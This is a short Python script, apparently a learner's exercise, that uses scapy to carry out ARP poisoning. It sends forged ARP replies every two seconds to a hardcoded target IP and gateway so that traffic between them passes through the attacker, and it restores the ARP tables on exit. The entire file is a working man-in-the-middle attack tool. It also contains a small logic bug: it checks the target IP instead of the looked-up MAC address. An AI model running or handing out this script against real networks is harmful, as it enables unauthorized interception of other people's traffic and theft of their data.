import scapy.all as scapy
import time
import sys



def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast / arp_req
    answered_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_ip:
        print(f"Could not find MAC address for {target_ip}. Exiting.")
        sys.exit()
    
    # op=2 (means ARP reply not request)
    # pdst = target_ip
    # hwdst = target_mac
    # psrc = spook_ip (who we are pretending to be)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    # to fix network targets when we exit the attack
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    
    # why count 4? 
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "10.12.106.236"
gateway_ip = "10.12.0.5"

if __name__ == "__main__":
    try:
        send_packets_count = 0
        print("[*]Starting ARP poisioning...")
        print(f"[*]Target : {target_ip} | Gateway : {gateway_ip}")
        print("[*]Press Ctrl + c to stop and restore network!")

        while True:
            spoof(target_ip, gateway_ip) # tell the target we are the gateway 
            spoof(gateway_ip, target_ip) # tell the gateway we are the target

            send_packets_count += 2
            print(f"\r[+]Packets sent: {send_packets_count}", end="")

            time.sleep(2) # arp table cache their entries but they still expire
            # we must send the fake packets every 2 seconds
    except KeyboardInterrupt:
        print("\n[-]Exiting. Restoring ARP tables. Wait...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[+]Network Restored.")
